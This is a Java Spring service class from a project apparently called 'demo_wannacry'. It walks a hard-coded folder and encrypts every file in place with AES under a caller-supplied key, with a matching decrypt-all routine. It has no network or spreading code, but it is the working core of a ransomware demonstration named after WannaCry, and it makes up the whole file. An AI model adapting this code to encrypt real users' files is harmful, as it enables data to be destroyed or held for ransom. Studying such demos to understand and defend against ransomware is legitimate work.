package com.example.demo_wannacry.services;

import com.example.demo_wannacry.exceptions.CryptoException;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.spec.SecretKeySpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.security.InvalidKeyException;
import java.security.Key;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Collectors;

@Service
@Slf4j
public class CryptFilesImpl implements CryptFiles {
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";
    private static final String DIR_FILES = "F:\\wannacryFiles\\";

    @Override
    public List<String> readFiles(){
        log.info("reading files ");
        File f=new File(DIR_FILES);
        List<String> listFilePaths=null;
        if(f.isDirectory()){
            List<File> files = Arrays.asList(f.listFiles());
            listFilePaths=files.stream().map(File::getAbsolutePath).collect(Collectors.toList());
        }
        return listFilePaths;
    }

    @Override
    public void encrypt(String key, File inputFile, File outputFile)
            throws CryptoException {
        log.info("encrypting the file "+inputFile.getName());
        doCrypto(Cipher.ENCRYPT_MODE, key, inputFile, outputFile);
    }

    @Override
    public void decrypt(String key, File inputFile, File outputFile)
            throws CryptoException {
        log.info("decrypting the file "+inputFile.getName());
        doCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);
    }

    @Override
    public void doCrypto(int cipherMode, String key, File inputFile,
                                 File outputFile) throws CryptoException {
        try {
            log.info("doCrypto "+inputFile.getName());
            Key secretKey = new SecretKeySpec(key.getBytes(), ALGORITHM);
            Cipher cipher = Cipher.getInstance(TRANSFORMATION);
            cipher.init(cipherMode, secretKey);

            FileInputStream inputStream = new FileInputStream(inputFile);
            byte[] inputBytes = new byte[(int) inputFile.length()];
            inputStream.read(inputBytes);

            byte[] outputBytes = cipher.doFinal(inputBytes);

            FileOutputStream outputStream = new FileOutputStream(outputFile);
            outputStream.write(outputBytes);

            inputStream.close();
            outputStream.close();

        } catch (NoSuchPaddingException | NoSuchAlgorithmException
                | InvalidKeyException | BadPaddingException
                | IllegalBlockSizeException | IOException ex) {
            log.error(ex.getMessage());
        }
    }

    @Override
    public void decryptAll(String key) {
        log.info("decryptAll ");
        List<String> files = readFiles();
        files.forEach(f-> {
            try {
                decrypt(key,new File(f),new File(f));
            } catch (CryptoException e) {
                log.error(e.getMessage());
            }
        });
    }

    @Override
    public void encryptAll(String key) {
        log.info("encryptAll");
        List<String> files = readFiles();
        files.forEach(f-> {
            try {
                encrypt(key,new File(f),new File(f));
            } catch (CryptoException e) {
                log.error(e.getMessage());
            }
        });
    }

}
